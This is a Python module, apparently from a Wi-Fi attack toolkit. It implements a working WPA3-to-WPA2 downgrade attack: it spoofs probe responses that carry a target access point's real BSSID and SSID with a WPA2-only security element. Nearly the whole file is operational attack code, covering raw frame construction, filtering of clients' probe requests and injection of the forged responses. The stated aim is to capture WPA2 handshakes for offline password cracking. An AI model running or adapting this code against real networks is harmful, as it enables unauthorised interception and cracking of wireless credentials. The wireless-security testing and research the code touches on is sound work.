"""WPA3 → WPA2 downgrade via probe-response spoofing.

Standard active downgrade attack against WPA3-Transition APs: forge probe
responses carrying the AP's real BSSID + SSID + channel but with a WPA2-only
RSN IE (SAE AKM stripped). When the targeted client receives our response
before/instead of the real AP's, it may pick WPA2 for its next association
attempt — done with the REAL AP, since the BSSID matches — and we passively
capture the WPA2 4-way for offline cracking.

Doable on a single card in monitor+inject. Does NOT work against pure WPA3 APs
(the client knows the SSID is SAE-only and refuses the WPA2-only ad).

This is a "wait" attack: PMF on WPA3 prevents kicking connected clients, so we
rely on natural reconnection triggers (wake-from-sleep, roam, DHCP renew, OS
WiFi toggle). Expect minutes-to-hours, not seconds.
"""

from __future__ import annotations

import asyncio
import logging
import struct
import time
from dataclasses import dataclass, field
from typing import Callable, Optional

from wifit3.engine.models import AccessPoint

from .campaign import Campaign

logger = logging.getLogger(__name__)


# Generic WPA2-PSK-CCMP RSN IE — no PMF, no SAE AKM. This is what we want the
# client to think the AP supports for this session.
#   30 14                              tag 48, length 20
#   01 00                              RSN version 1
#   00 0f ac 04                        group cipher = CCMP
#   01 00 00 0f ac 04                  1 pairwise cipher = CCMP
#   01 00 00 0f ac 02                  1 AKM = PSK (2). NOT SAE (8).
#   00 00                              RSN capabilities = 0 (no PMF)
_DOWNGRADE_RSN_IE = bytes.fromhex("30140100000fac040100000fac040100000fac020000")

# Standard supported-rates IEs.
_SUPPORTED_RATES = bytes([0x82, 0x84, 0x8B, 0x96, 0x0C, 0x12, 0x18, 0x24])
_EXT_SUPPORTED_RATES = bytes([0x30, 0x48, 0x60, 0x6C])

# Capability Info: ESS + Privacy + Short Slot Time.
_CAPABILITY_INFO = 0x0411


def _mac_str(b: bytes) -> str:
    return ":".join(f"{x:02x}" for x in b)


def _str_to_mac(s: str) -> bytes:
    return bytes(int(x, 16) for x in s.split(":"))


@dataclass
class WPA3DowngradeStats:
    probes_seen: int = 0
    directed_probes: int = 0
    wildcard_probes: int = 0
    responses_sent: int = 0
    responses_failed: int = 0
    started_at: float = field(default_factory=time.time)


class WPA3DowngradeAttack(Campaign):
    """Probe-response spoofing daemon. Sync RX filter + async injection task.

    Event-driven: ``_loop()`` registers the RX callback and idles until stopped;
    ``teardown()`` unregisters. The actual work is per-probe forged responses fired
    from ``_rx_cb``. All work happens on the asyncio loop — the RX callback runs on
    the loop (drivers create the RX pump via ``asyncio.create_task``), and per-probe
    injection is scheduled via ``asyncio.create_task`` on the same loop.
    """

    button_id = "btn-wpa3-down"
    key = "wpa3down"
    hotkey = ("g", "WPA↓")
    idle_label = "WPA ↓"
    run_label = "Stop ↓"
    idle_variant = "primary"
    run_variant = "primary"

    @classmethod
    def visible(cls, ap) -> bool:
        return bool(getattr(ap, "wpa3", False) and getattr(ap, "transition_mode", False))

    def __init__(
        self,
        iface,
        target: AccessPoint,
        log_callback: Optional[Callable[[str], None]] = None,
    ):
        if not target.ssid:
            raise ValueError("WPA3 Downgrade requires a known SSID — target is hidden.")
        super().__init__(ap=target, iface=iface)
        self.target = target
        self._log = log_callback or (lambda _msg: None)
        self.stats = WPA3DowngradeStats()
        self._active = False
        self._target_ssid_bytes = target.ssid.encode("utf-8", errors="ignore")
        self._bssid_bytes = _str_to_mac(target.bssid)
        # Pre-built template with a 6-byte placeholder for Addr1 (dest = client).
        # Per-probe work is just splicing in the client MAC + sending.
        self._template = self._build_probe_response_template()

    # -- Frame builder --------------------------------------------------------

    def _build_probe_response_template(self) -> bytes:
        """Build the probe-response frame with Addr1 left blank.

        Layout: 24B MAC header + 12B fixed params + tagged params. Addr1
        (bytes 4..10) is the placeholder — splice in the client MAC per probe.
        """
        fc = b"\x50\x00"
        duration = b"\x00\x00"
        addr1_placeholder = b"\x00" * 6
        addr2 = self._bssid_bytes
        addr3 = self._bssid_bytes
        seq_ctrl = b"\x00\x00"
        mac_header = fc + duration + addr1_placeholder + addr2 + addr3 + seq_ctrl

        # Fixed params: TSF timestamp (8B), beacon interval (2B), capabilities (2B).
        # Most clients ignore timestamp until associated; current epoch in µs is fine.
        timestamp = struct.pack("<Q", int(time.time() * 1_000_000))
        beacon_interval = struct.pack("<H", 100)  # 100 TU ≈ 102.4 ms
        capability = struct.pack("<H", _CAPABILITY_INFO)
        fixed = timestamp + beacon_interval + capability

        # Tagged params: SSID, Supported Rates, DS Param Set, Ext Rates, RSN (WPA2-only).
        ssid_ie = bytes([0x00, len(self._target_ssid_bytes)]) + self._target_ssid_bytes
        rates_ie = bytes([0x01, len(_SUPPORTED_RATES)]) + _SUPPORTED_RATES
        ds_param_ie = bytes([0x03, 0x01, self.target.channel & 0xFF])
        ext_rates_ie = bytes([0x32, len(_EXT_SUPPORTED_RATES)]) + _EXT_SUPPORTED_RATES
        rsn_ie = _DOWNGRADE_RSN_IE

        tags = ssid_ie + rates_ie + ds_param_ie + ext_rates_ie + rsn_ie
        return mac_header + fixed + tags

    # -- Lifecycle ------------------------------------------------------------

    async def _loop(self) -> None:
        """Register the probe-request RX filter, then idle until stopped — the work
        is event-driven (per-probe forged responses fire from _rx_cb)."""
        self._active = True
        self.stats = WPA3DowngradeStats()
        self.iface.register_rx_callback(self._rx_cb)
        logger.info(
            f"[WPA3-Down] Active on {self.target.bssid} ({self.target.ssid}) "
            f"CH {self.target.channel}"
        )
        while not self.stopped:
            await asyncio.sleep(0.2)

    async def teardown(self) -> None:
        """Unregister the RX filter on every exit. Idempotent; ``stats`` lives on as
        an attribute for the screen to read after stopping."""
        if not self._active:
            return
        self._active = False
        self.iface.unregister_rx_callback(self._rx_cb)
        logger.info(
            f"[WPA3-Down] Stopped: {self.stats.probes_seen} probes seen, "
            f"{self.stats.responses_sent} forged responses sent."
        )

    # -- Hot path: RX filter + async dispatch --------------------------------

    def _rx_cb(self, frame_bytes: bytes, rssi: int, ts: float) -> None:
        """Sync, runs on asyncio loop. Keep this fast — minimal work, defer
        injection to an asyncio task."""
        if self.stopped or not self._active:   # request_stop() gates us before teardown unregisters
            return
        # Need at least MAC header (24B) + SSID IE tag+len (2B) + 2B for one rate IE start.
        if len(frame_bytes) < 28:
            return
        # FC byte0: type=Mgmt(00), subtype=ProbeReq(0100) → 0x40. Mask out version.
        if (frame_bytes[0] & 0xFC) != 0x40:
            return
        client_mac = frame_bytes[10:16]
        # Tag 0 (SSID IE) MUST be first in a probe request per 802.11.
        if frame_bytes[24] != 0x00:
            return
        ssid_len = frame_bytes[25]
        if 26 + ssid_len > len(frame_bytes):
            return

        is_wildcard = ssid_len == 0
        is_directed_for_us = (
            ssid_len > 0 and frame_bytes[26:26 + ssid_len] == self._target_ssid_bytes
        )
        if not (is_wildcard or is_directed_for_us):
            # Probe for some other SSID — not our race to run.
            return

        self.stats.probes_seen += 1
        if is_wildcard:
            self.stats.wildcard_probes += 1
            kind = "wildcard"
        else:
            self.stats.directed_probes += 1
            kind = "directed"

        # Bridge sync→async: fire-and-forget injection task. Microsecond overhead.
        asyncio.create_task(self._send_forged_response(bytes(client_mac), kind))

    async def _send_forged_response(self, client_mac: bytes, probe_kind: str) -> None:
        """Splice client MAC into Addr1 of cached template and inject."""
        # Frame = FC+Dur (4B) + client_mac (6B) + rest_of_template (from byte 10)
        frame = self._template[:4] + client_mac + self._template[10:]
        try:
            ok = await self.iface.send_raw(frame, use_no_ack=True)
        except Exception:
            logger.exception("[WPA3-Down] send_raw failed")
            ok = False
        if ok:
            self.stats.responses_sent += 1
        else:
            self.stats.responses_failed += 1
        # Per-probe detail goes to the debug logger only — the UI surfaces live counts via a
        # SECURITY-panel status line, not one event-log line per probe (which would flood it).
        logger.debug(
            "[WPA3-Down] %s probe from %s → forged WPA2-only resp (ok=%s)",
            probe_kind, _mac_str(client_mac), ok,
        )
